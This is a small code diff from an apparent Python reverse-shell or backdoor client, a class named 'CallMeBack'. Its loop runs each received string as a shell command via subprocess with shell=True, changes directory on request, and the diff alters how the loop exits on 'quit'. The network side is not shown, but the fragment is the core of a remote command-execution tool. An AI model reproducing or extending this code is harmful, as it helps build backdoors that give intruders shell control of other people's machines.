@@ -62,7 +62,7 @@ class CallMeBack:
                 Data = subprocess.run(data,shell=True,capture_output=True)
                 path = os.getcwd()+ ' > '  
                 if 'quit' in data:
-                    break
+                    exit()
                 elif 'cd' in data:
                     try:
                         os.chdir(str(" ".join(data.split()[1:])))
